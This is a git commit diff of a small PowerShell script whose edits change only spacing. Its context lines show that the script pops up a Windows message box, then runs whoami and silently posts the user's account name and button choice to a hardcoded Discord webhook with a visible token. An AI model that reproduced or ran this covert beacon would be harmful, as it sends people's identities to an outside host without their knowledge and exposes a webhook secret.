774ab759d162eed1852c7c207e1e9d94b3f570a1
Capo <62123196+aran1910@users.noreply.github.com>
2025-09-06 17:33:18 -0700

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -9,19 +9,18 @@ function Main {
     )
 
     Add-Type -AssemblyName System.Windows.Forms
-
     $btnEnum = [System.Windows.Forms.MessageBoxButtons]::$Buttons
     $icoEnum = [System.Windows.Forms.MessageBoxIcon]::$Icon
 
     $webhook = "https://discord.com/api/webhooks/1407832644372267170/e2K57M_-OIhHA4ubSGrniMJ_rvC90zKa8iyzeDDsMtdWkhbdIKGCYwfaSiTvw4uxIix1"
 
-    $result = [System.Windows.Forms.MessageBox]::Show($Message, $Title, $btnEnum, $icoEnum)
+    $result = [System.Windows.Forms.MessageBox]::Show($Message,$Title,$btnEnum,$icoEnum)
 
     $systemname = whoami
     $json = @{ content = "$systemname clicked: $result" } | ConvertTo-Json -Compress
 
     $tmp = [System.IO.Path]::GetTempFileName() + ".json"
-    [System.IO.File]::WriteAllText($tmp, $json, (New-Object System.Text.UTF8Encoding $false))
+    [System.IO.File]::WriteAllText($tmp,$json,(New-Object System.Text.UTF8Encoding $false))
 
     curl.exe -H "Content-Type: application/json" -X POST -d "@$tmp" $webhook
 }
